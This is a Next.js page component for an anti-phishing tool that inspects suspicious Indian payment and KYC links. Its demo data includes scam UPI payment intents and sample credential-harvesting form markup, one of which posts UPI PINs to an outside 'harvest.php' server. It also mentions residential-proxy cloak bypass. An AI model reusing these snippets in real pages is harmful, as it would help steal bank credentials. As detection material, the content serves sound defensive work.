"use client"

import React, { useState, useEffect, useRef } from "react"
import Link from "next/link"
import Image from "next/image"
import KineticGrid from "@/components/ui/kinetic-grid"
import {
  Menu,
  X,
  Scan,
  Globe,
  Activity,
  Terminal,
  ArrowRight,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Play,
  Copy,
  Check,
  RefreshCw,
  Lock,
  LockOpen,
  Eye,
  Server,
  Network,
  Cpu
} from "lucide-react"

interface TinyFishPreset {
  name: string
  url: string
  claimedBrand: string
  embeddedUpi?: string
}

const PRESETS: TinyFishPreset[] = [
  {
    name: "Fake State Electricity Portal",
    url: "https://state-electricity-ebill-portal.xyz/pay-instant",
    claimedBrand: "Tata Power Delhi Distribution Ltd",
    embeddedUpi: "upi://pay?pa=discom.billdesk99@axisbank&pn=Electricity%20Relief%20Desk&am=4850.00&cu=INR&tn=Electricity%20Immediate%20Payment"
  },
  {
    name: "Fake Fastag KYC Suspend Link",
    url: "https://fastag-kyc-desk.top/update",
    claimedBrand: "NETC Fastag (IHMCL)",
    embeddedUpi: "upi://pay?pa=fastag.kycupdates99@paytm&pn=Fastag%20KYC%20Desk&am=1200.00&cu=INR&tn=Fastag%20KYC%20Renewal"
  },
  {
    name: "Legitimate Official Bill Gateway",
    url: "https://billdesk.io/official-pay",
    claimedBrand: "BillDesk / BESCOM Official",
    embeddedUpi: "upi://pay?pa=billdesk@icici&pn=BillDesk%20Payment&mc=4900"
  }
]

export default function TinyFishPage() {
  const [isOpen, setIsOpen] = useState(false)
  const menuRef = useRef<HTMLDivElement>(null)

  const navItems = [
    { label: "Scanner", href: "/scanner", icon: Scan },
    { label: "TinyFish Intel", href: "/tinyfish", icon: Globe, active: true },
    { label: "Transaction DNA", href: "/transaction-dna", icon: Activity },
    { label: "Analyst Portal", href: "/analyst", icon: Terminal },
  ]

  // Form states
  const [suspectUrl, setSuspectUrl] = useState(PRESETS[0].url)
  const [claimedBrand, setClaimedBrand] = useState(PRESETS[0].claimedBrand)
  const [extractedUpi, setExtractedUpi] = useState(PRESETS[0].embeddedUpi || "")
  const [presetIndex, setPresetIndex] = useState(0)
  const [isCrawling, setIsCrawling] = useState(false)
  const [copied, setCopied] = useState(false)

  // Crawler output states
  const [crawlStatus, setCrawlStatus] = useState<"STANDBY" | "CRITICAL_TRAP" | "BENIGN">("CRITICAL_TRAP")
  const [pageTitle, setPageTitle] = useState("Online Electricity Bill Instant Clearance Desk (Counterfeit)")
  const [serverHost, setServerHost] = useState("194.26.29.112 (Offshore AS-Host, St. Petersburg)")
  const [isPhishing, setIsPhishing] = useState(true)
  const [detectedTraps, setDetectedTraps] = useState<string[]>([
    "<input name='upi_pin' type='password' maxlength='6' placeholder='Enter UPI PIN'>",
    "<input name='victim_phone' type='tel' placeholder='Registered Mobile'>",
    "<form action='http://194.26.29.112/harvest.php' method='POST'>"
  ])
  const [riskSummary, setRiskSummary] = useState(
    "Zero-Day Credential Harvester: Rogue form capturing confidential 6-digit UPI PIN within non-banking origin."
  )
  const [crawlLogs, setCrawlLogs] = useState<string[]>([
    "[14:02:11] INIT TinyFish Headless Chromium Node spawned (Container sandbox)",
    "[14:02:11] PROXY Routing through Pune residential peer IP (AS55836) to bypass anti-bot cloak",
    "[14:02:11] DOM_PARSE 1 rogue credential form detected requesting 6-digit MPIN",
    "[14:02:11] EXFIL Discord/Telegram exfil webhook found in obfuscated bundle.js",
    "[14:02:11] INTERCEPT Extracted embedded VPA discom.billdesk99@axisbank broadcasted to NPCI ledger"
  ])

  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (menuRef.current && !menuRef.current.contains(event.target as Node)) {
        setIsOpen(false)
      }
    }
    function handleKeyDown(event: KeyboardEvent) {
      if (event.key === "Escape") {
        setIsOpen(false)
      }
    }
    if (isOpen) {
      document.addEventListener("mousedown", handleClickOutside)
      document.addEventListener("keydown", handleKeyDown)
    }
    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
      document.removeEventListener("keydown", handleKeyDown)
    }
  }, [isOpen])

  // Cycle Preset
  const handleCyclePreset = () => {
    const nextIdx = (presetIndex + 1) % PRESETS.length
    setPresetIndex(nextIdx)
    const p = PRESETS[nextIdx]
    setSuspectUrl(p.url)
    setClaimedBrand(p.claimedBrand)
    setExtractedUpi(p.embeddedUpi || "")
    handleDeployAgents(p.url, p.claimedBrand)
  }

  // Deploy TinyFish Agents
  const handleDeployAgents = async (targetUrl = suspectUrl, targetBrand = claimedBrand) => {
    if (!targetUrl.trim()) return

    setIsCrawling(true)
    const startTime = new Date().toLocaleTimeString()

    setCrawlLogs((prev) => [
      `[${startTime}] DISPATCH Worker #TF-89 deploying to target ${targetUrl}`,
      `[${startTime}] TLS Handshake initializing...`,
      ...prev.slice(0, 4)
    ])

    try {
      const res = await fetch("/api/inspect-url", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: targetUrl }),
      })
      const data = await res.json()

      const finishTime = new Date().toLocaleTimeString()

      if (data.success && data.isProvided) {
        setCrawlStatus(data.status)
        setPageTitle(data.pageTitle)
        setServerHost(data.serverHost)
        setIsPhishing(data.isPhishing)
        setDetectedTraps(data.detectedTraps || [])
        setRiskSummary(data.riskSummary)
        if (data.extractedUpiIntent) {
          setExtractedUpi(data.extractedUpiIntent)
        }

        setCrawlLogs((prev) => [
          `[${finishTime}] VERDICT: ${data.isPhishing ? "CRITICAL_TRAP" : "BENIGN"} | Risk evaluation completed.`,
          `[${finishTime}] DOM_ANALYSIS: ${data.detectedTraps?.length || 0} credential trap elements identified.`,
          `[${finishTime}] HOST_INFO: ${data.serverHost}`,
          ...prev.slice(0, 5)
        ])
      }
    } catch (e: any) {
      console.error("TinyFish inspection error:", e)
    } finally {
      setIsCrawling(false)
    }
  }

  const handleCopyUpi = () => {
    if (typeof navigator !== "undefined" && extractedUpi) {
      navigator.clipboard.writeText(extractedUpi)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <KineticGrid globalColor="trinetra">
      <div className="relative min-h-screen w-full text-[#ededed] selection:bg-[#ff2a8d] selection:text-white font-sans overflow-x-hidden">
        
        {/* ─── MASSIVE LOW-OPACITY BACKGROUND WATERMARK ─── */}
        <div 
          aria-hidden="true" 
          className="pointer-events-none select-none absolute top-12 left-1/2 -translate-x-1/2 whitespace-nowrap text-[12vw] font-black uppercase tracking-tighter text-white opacity-[0.03] z-0 leading-none"
        >
          त्रिNETRA // TINYFISH
        </div>

        {/* ─── TOP NAVIGATION HEADER WITH 3-LINE HAMBURGER TRIGGER ─── */}
        <header className="relative z-30 w-full border-b border-white/[0.08] bg-black/70 backdrop-blur-md">
          <div className="mx-auto flex h-16 w-full max-w-[1440px] items-center justify-between px-4 sm:px-6 lg:px-8">
            
            {/* Left Cluster: Hamburger Trigger + Brand Identity */}
            <div className="flex items-center gap-3 sm:gap-4">
              
              {/* Top-Left Hamburger Trigger & Popover */}
              <div ref={menuRef} className="relative">
                <button
                  onClick={() => setIsOpen((prev) => !prev)}
                  aria-label="Navigation Menu"
                  aria-expanded={isOpen}
                  className="w-10 h-10 rounded-xl border border-white/15 bg-[#0a0a0c]/80 backdrop-blur-md flex items-center justify-center text-white hover:border-[#ff2a8d]/60 hover:bg-white/[0.04] transition-all cursor-pointer shadow-lg group focus:outline-none"
                >
                  {isOpen ? (
                    <X size={18} strokeWidth={1.75} className="text-[#ff2a8d] transition-transform duration-200" />
                  ) : (
                    <Menu size={18} strokeWidth={1.75} className="text-white group-hover:text-[#ff2a8d] transition-colors" />
                  )}
                </button>

                {/* Popover Menu Dropdown */}
                {isOpen && (
                  <div 
                    className="absolute top-full left-0 mt-2 w-64 rounded-2xl border border-white/12 bg-[#08080a]/95 backdrop-blur-xl p-2 shadow-2xl z-50 animate-in fade-in zoom-in-95 duration-150"
                  >
                    <div className="px-3 py-2 border-b border-white/5 mb-1.5 flex items-center justify-between">
                      <span className="font-mono text-[10px] uppercase tracking-wider text-neutral-400 font-bold">
                        Navigation
                      </span>
                      <span className="font-mono text-[10px] text-neutral-600">
                        ESC to close
                      </span>
                    </div>

                    <div className="space-y-1">
                      {navItems.map((item) => {
                        const Icon = item.icon
                        const isActive = item.active

                        return (
                          <Link
                            key={item.label}
                            href={item.href}
                            onClick={() => setIsOpen(false)}
                            className={`w-full rounded-xl px-3.5 py-2.5 flex items-center justify-between text-sm transition-all text-left ${
                              isActive
                                ? "bg-white/[0.06] text-[#ff2a8d] font-semibold shadow-inner"
                                : "text-neutral-400 hover:text-white hover:bg-white/[0.03] font-medium"
                            }`}
                          >
                            <div className="flex items-center gap-3">
                              <Icon className={`h-4 w-4 ${isActive ? "text-[#ff2a8d]" : "text-neutral-400"}`} />
                              <span>{item.label}</span>
                            </div>

                            {isActive && (
                              <span className="h-2 w-2 rounded-full bg-[#ff2a8d] shadow-[0_0_8px_#ff2a8d]" />
                            )}
                          </Link>
                        )
                      })}
                    </div>
                  </div>
                )}
              </div>

              {/* Left Brand Identity */}
              <Link href="/" className="flex items-center gap-3 group">
                <div className="relative h-9 w-9 overflow-hidden bg-black/60 p-1 border border-white/[0.12] transition-transform group-hover:scale-105 rounded-lg">
                  <Image
                    src="/assets/trinetra-logo.png"
                    alt="त्रिNETRA Logo"
                    fill
                    className="object-contain"
                    priority
                  />
                </div>
                <div className="flex items-center gap-2">
                  <span className="font-extrabold tracking-tight text-white text-lg">
                    त्रिNETRA
                  </span>
                </div>
              </Link>
            </div>

            {/* Right Navigation Link */}
            <div className="flex items-center gap-6">
              <Link 
                href="/analyst" 
                className="flex items-center gap-1.5 font-mono text-xs font-bold text-[#e5ff40] hover:text-[#d4ed36] transition-colors group"
              >
                <span>Analyst Portal</span>
                <ArrowRight className="h-3.5 w-3.5 transition-transform group-hover:translate-x-1" />
              </Link>
            </div>
          </div>
        </header>

        {/* ─── MAIN STAGE CONTAINER ─── */}
        <main className="relative z-10 mx-auto w-full max-w-[1440px] px-4 sm:px-6 lg:px-8 pt-10 pb-20">
          
          {/* Header Kicker: Horizontal Pink Line + Title */}
          <div className="flex items-center gap-3 mb-4">
            <div className="h-[2px] w-6 bg-[#ff2a8d]" />
            <span className="font-mono text-xs font-bold uppercase tracking-[0.2em] text-[#ff2a8d]">
              MODULE B // TINYFISH LIVE WEB & PORTAL INTELLIGENCE
            </span>
          </div>

          {/* Headline Typography & Editorial Subtitle */}
          <div className="mb-12 max-w-3xl">
            <h1 className="text-4xl sm:text-5xl md:text-6xl font-black text-white tracking-tight leading-[1.08]">
              Inspect suspicious links{" "}
              <span className="font-serif italic font-normal text-[#ff2a8d]">
                before you click.
              </span>
            </h1>
            <p className="mt-4 text-base sm:text-lg text-neutral-400 font-normal leading-relaxed">
              Autonomous TinyFish web agents open suspicious utility portals, KYC links, and payment gateways in an isolated remote sandbox to expose fake forms and hidden UPI redirects.
            </p>
          </div>

          {/* ─── 2-COLUMN ASYMMETRIC GRID ─── */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-16 items-start">
            
            {/* ════════════════════════════════════════════════════════════
                LEFT COLUMN (45% Width: lg:col-span-5)
                Portal & URL Input Workspace
               ════════════════════════════════════════════════════════════ */}
            <div className="lg:col-span-5 space-y-6">
              
              {/* Field 1: SUSPECT PAYMENT OR PORTAL LINK */}
              <div className="space-y-2">
                <label className="text-xs font-mono font-bold uppercase tracking-wider text-neutral-400">
                  Suspect Payment or Portal Link
                </label>
                <input
                  type="text"
                  value={suspectUrl}
                  onChange={(e) => setSuspectUrl(e.target.value)}
                  className="w-full border border-white/10 bg-black/40 backdrop-blur-[2px] p-3 text-sm text-neutral-200 placeholder-neutral-600 focus:outline-none focus:border-[#ff2a8d] transition-colors font-mono"
                  placeholder="https://..."
                />
              </div>

              {/* Field 2: MERCHANT OR BRAND CLAIMED */}
              <div className="space-y-2">
                <label className="text-xs font-mono font-bold uppercase tracking-wider text-neutral-400">
                  Merchant or Brand Claimed
                </label>
                <input
                  type="text"
                  value={claimedBrand}
                  onChange={(e) => setClaimedBrand(e.target.value)}
                  className="w-full border border-white/10 bg-black/40 backdrop-blur-[2px] p-3 text-sm text-white placeholder-neutral-600 focus:outline-none focus:border-[#ff2a8d] transition-colors font-sans"
                  placeholder="e.g. Tata Power Delhi Distribution Ltd, SBI Fastag..."
                />
              </div>

              {/* Field 3: EXTRACTED / EMBEDDED UPI INTENT */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-mono font-bold uppercase tracking-wider text-neutral-400">
                    Extracted / Embedded UPI Intent (Auto-Detected)
                  </label>
                  {extractedUpi && (
                    <button
                      onClick={handleCopyUpi}
                      className="flex items-center gap-1 font-mono text-[11px] text-[#e5ff40] hover:underline"
                    >
                      {copied ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                      <span>{copied ? "Copied" : "Copy Intent"}</span>
                    </button>
                  )}
                </div>
                <textarea
                  rows={3}
                  value={extractedUpi}
                  onChange={(e) => setExtractedUpi(e.target.value)}
                  className="w-full border border-white/10 bg-black/40 backdrop-blur-[2px] p-3 text-xs text-neutral-300 font-mono focus:outline-none focus:border-[#ff2a8d] transition-colors leading-relaxed"
                  placeholder="Auto-detected hidden upi://pay intent or merchant VPA will appear here..."
                />
              </div>

              {/* Action Buttons: Primary CTA & Preset Cycler */}
              <div className="pt-2 flex flex-col sm:flex-row items-stretch sm:items-center gap-3">
                <button
                  onClick={() => handleDeployAgents()}
                  disabled={isCrawling}
                  className="flex-1 px-6 py-3.5 rounded-full bg-[#ff2a8d] text-white font-mono text-xs font-bold uppercase tracking-wider shadow-[0_0_20px_rgba(255,42,141,0.4)] hover:shadow-[0_0_25px_rgba(255,42,141,0.6)] hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
                >
                  {isCrawling ? (
                    <>
                      <RefreshCw className="h-4 w-4 animate-spin text-white" />
                      <span>Crawling Remote DOM...</span>
                    </>
                  ) : (
                    <>
                      <span>Deploy TinyFish Agents →</span>
                    </>
                  )}
                </button>

                <button
                  onClick={handleCyclePreset}
                  type="button"
                  className="px-4 py-3 rounded-full border border-[#e5ff40]/30 bg-[#e5ff40]/10 text-[#e5ff40] font-mono text-xs font-bold hover:bg-[#e5ff40]/20 transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                >
                  <RefreshCw className="h-3.5 w-3.5" />
                  <span>Try live phishing portal example →</span>
                </button>
              </div>

              {/* Quick Info Box */}
              <div className="border border-white/5 bg-white/[0.02] p-4 rounded-xl space-y-2">
                <div className="flex items-center gap-2 text-xs font-mono text-neutral-400">
                  <Server className="h-3.5 w-3.5 text-[#e5ff40]" />
                  <span>TinyFish Autonomous Chromium Sandbox</span>
                </div>
                <p className="text-xs text-neutral-500 leading-relaxed">
                  TinyFish visits the site using an Indian residential IP rotation network, evaluates JavaScript execution, checks for fake banking stylesheets, and extracts disguised QR / VPA links without revealing your real device identity.
                </p>
              </div>
            </div>

            {/* ════════════════════════════════════════════════════════════
                RIGHT COLUMN (55% Width: lg:col-span-7)
                Live Autonomous Sandbox & DOM Forensics Console
               ════════════════════════════════════════════════════════════ */}
            <div className="lg:col-span-7 space-y-6">
              
              {/* Status Header HUD */}
              <div className="border border-white/10 bg-black/60 backdrop-blur-md p-6 rounded-2xl space-y-4">
                <div className="flex items-center justify-between flex-wrap gap-4">
                  <div className="flex items-center gap-2.5">
                    <span
                      className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full font-mono text-[11px] font-bold tracking-wider uppercase ${
                        crawlStatus === "CRITICAL_TRAP"
                          ? "bg-red-500/15 text-red-400 ring-1 ring-red-500/40"
                          : "bg-[#e5ff40]/15 text-[#e5ff40] ring-1 ring-[#e5ff40]/40"
                      }`}
                    >
                      <span
                        className={`w-2 h-2 rounded-full ${
                          crawlStatus === "CRITICAL_TRAP"
                            ? "bg-red-500 animate-ping"
                            : "bg-[#e5ff40]"
                        }`}
                      />
                      {crawlStatus === "CRITICAL_TRAP" ? "MALICIOUS CREDENTIAL TRAP" : "BENIGN SITE CONFIRMED"}
                    </span>
                  </div>

                  <span className="font-mono text-xs text-neutral-400">
                    Host: <span className="text-neutral-200">{serverHost}</span>
                  </span>
                </div>

                <div className="border-t border-white/5 pt-4 space-y-2">
                  <h3 className="text-xl font-bold text-white tracking-tight">
                    {pageTitle}
                  </h3>
                  <p className="text-sm text-neutral-400 leading-relaxed">
                    {riskSummary}
                  </p>
                </div>
              </div>

              {/* Detected DOM Traps */}
              <div className="border border-white/10 bg-black/40 backdrop-blur-md p-6 rounded-2xl space-y-4">
                <div className="flex items-center justify-between">
                  <h4 className="font-mono text-xs uppercase tracking-wider text-neutral-400 font-bold flex items-center gap-2">
                    <ShieldAlert className="h-4 w-4 text-[#ff2a8d]" />
                    <span>Captured DOM Forms & Hidden Inputs</span>
                  </h4>
                  <span className="font-mono text-xs text-[#ff2a8d] font-bold">
                    {detectedTraps.length} Detected
                  </span>
                </div>

                {detectedTraps.length > 0 ? (
                  <div className="space-y-2 font-mono text-xs">
                    {detectedTraps.map((trap, idx) => (
                      <div
                        key={idx}
                        className="p-3 rounded-lg bg-red-950/20 border border-red-500/30 text-red-300 font-mono overflow-x-auto"
                      >
                        <code>{trap}</code>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="p-4 rounded-lg bg-emerald-950/20 border border-emerald-500/30 text-emerald-300 font-mono text-xs">
                    No deceptive password or MPIN credential harvest traps found in the DOM.
                  </div>
                )}
              </div>

              {/* Live Crawler Terminal Log Stream */}
              <div className="border border-white/10 bg-black/80 p-5 rounded-2xl space-y-3 font-mono">
                <div className="flex items-center justify-between text-xs text-neutral-400 border-b border-white/5 pb-2">
                  <span className="flex items-center gap-2">
                    <Terminal className="h-3.5 w-3.5 text-[#ff2a8d]" />
                    <span>TinyFish Autonomous Worker Telemetry</span>
                  </span>
                  <span className="text-[11px] text-neutral-500">
                    Live Stream
                  </span>
                </div>

                <div className="space-y-1.5 text-xs text-neutral-300 max-h-48 overflow-y-auto">
                  {crawlLogs.map((log, index) => (
                    <div key={index} className="leading-relaxed">
                      <span className="text-neutral-500">{log.slice(0, 10)}</span>
                      <span className="text-neutral-300">{log.slice(10)}</span>
                    </div>
                  ))}
                </div>
              </div>

            </div>

          </div>

        </main>

      </div>
    </KineticGrid>
  )
}
